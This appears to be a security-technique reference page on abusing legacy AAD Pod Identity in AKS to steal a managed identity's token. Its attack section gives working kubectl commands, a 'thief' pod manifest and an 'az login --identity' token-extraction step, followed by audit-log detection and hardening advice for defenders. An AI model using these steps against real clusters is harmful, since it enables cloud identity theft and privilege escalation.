# [PE-VALID-016]: Managed Identity Pod Assignment (AAD Pod Identity Abuse)

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-VALID-016 |
| **MITRE ATT&CK v18.1** | [Valid Accounts: Cloud Accounts (T1078.004)](https://attack.mitre.org/techniques/T1078/004/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | AKS / Entra ID |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** "AAD Pod Identity" (and its successor "Entra Workload ID") allows assigning Azure Identities to specific pods. In the legacy AAD Pod Identity model, this works by intercepting token requests on the node (NMI pod) and exchanging them. If an attacker can create a pod with the label `aadpodidbinding: <IdentityName>`, they can steal the token for *any* identity available in the cluster, provided the AzureIdentityBinding exists.
- **Attack Surface:** Kubernetes Pod Specs.
- **Business Impact:** **Identity Theft**.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Create Pods in a namespace.
- **Tools:** `kubectl`

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: List Identities**
Find available identity bindings.
```bash
kubectl get azureidentitybinding --all-namespaces
```

**Step 2: Create Malicious Pod**
Create a pod that requests the high-privilege identity.
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: thief
  labels:
    aadpodidbinding: "admin-identity" # Found in step 1
spec:
  containers:
  - name: azure-cli
    image: mcr.microsoft.com/azure-cli
    command: ["sleep", "3600"]
```

**Step 3: Extract Token**
Exec into the pod and request a token.
```bash
kubectl exec -it thief -- az login --identity
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Kubernetes Audit Logs
| Source | Event | Filter Logic |
|---|---|---|
| **KubeAudit** | `Create Pod` | Pods created with `aadpodidbinding` labels by unexpected users. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Upgrade:** Move to **Entra Workload ID** (Federated Identity), which relies on Service Account token projection and OIDC, removing the insecure NMI interception mechanism.
*   **Policy:** Use OPA Gatekeeper to restrict which `aadpodidbinding` labels can be used by which namespaces.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-CLOUD-003]
> **Next Logical Step:** [PE-VALID-011]
